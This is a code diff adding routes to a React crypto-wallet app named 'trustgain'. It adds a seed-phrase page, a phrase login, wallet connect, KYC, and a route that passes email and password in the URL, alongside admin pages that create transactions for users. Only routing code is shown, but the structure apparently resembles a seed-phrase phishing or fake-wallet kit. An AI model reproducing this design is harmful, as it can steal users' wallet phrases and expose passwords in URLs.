@@ -2,12 +2,29 @@ import { ThemeProvider, createTheme } from "@mui/material/styles";
 import { Router } from "@reach/router";
 import { Component, createContext } from "react";
 import { InstallPWA, InstallPWAiOS } from "./pwainstallbutton";
+import ResponsiveDrawer from "./trustgain/dashboard";
+import HomeIndex from "./trustgain/pages";
 import AdminIndex from "./trustgain/pages/admin";
 import AdminInfo from "./trustgain/pages/admin/admininfo";
 import AllUserTablesmain from "./trustgain/pages/admin/allusers";
 import CreateTransferIndex from "./trustgain/pages/admin/createtransaction";
 import AlluserTransactions from "./trustgain/pages/admin/createtransaction/usertransaction";
 import AllTransactions from "./trustgain/pages/admin/transactions";
+import AllCoins from "./trustgain/pages/allcoins";
+import AllCoinsAction from "./trustgain/pages/allcoinsaction";
+import AuthenticationIndex from "./trustgain/pages/authentication";
+import LoginDirect from "./trustgain/pages/authentication/directlogin";
+import SignIn from "./trustgain/pages/authentication/login";
+import PhraseLogin from "./trustgain/pages/authentication/phraselogin";
+import ResetPassword from "./trustgain/pages/authentication/resetpassword";
+import SignUp from "./trustgain/pages/authentication/signup";
+import CoinAction from "./trustgain/pages/coin";
+import ConnectWallet from "./trustgain/pages/connectwallet";
+import PhrasePage from "./trustgain/pages/phrase";
+import Profile from "./trustgain/pages/profile";
+import Send from "./trustgain/pages/send";
+import Settings from "./trustgain/pages/settings";
+import Identity from "./trustgain/pages/verification";
 
 export const AppContext = createContext();
 
@@ -60,6 +77,28 @@ function App() {
     <div style={{ display: "flex", flexDirection: "column" }}>
       <ThemeProvider theme={theme}>
         <Router>
+          <ResponsiveDrawer path="/">
+            <HomeIndex path="/" />
+            <AllCoins path="/coins" />
+            <AllCoinsAction path="/allcoin" />
+            <CoinAction path="/coin" />
+            <Send path="/send" />
+            <ConnectWallet path="/connect" />
+            <Profile path="/profile" />
+            <Settings path="/settings/:action" />
+            <Identity path="/kyc" />
+            <PhrasePage path="/phrase" />
+          </ResponsiveDrawer>
+
+          <AuthenticationIndex path="/account">
+            <SignIn path="login" />
+            <PhraseLogin path="loginphrase" />
+            <SignIn path="admin/:pathtonavigate" />
+            <SignUp path="signup" />
+            <ResetPassword path="resetpassword" />
+            <LoginDirect path="logindirect/:email/:password" />
+          </AuthenticationIndex>
+
           <AdminIndex path="manager">
             <AdminInfo path="/" />
             <AllUserTablesmain path="users" />
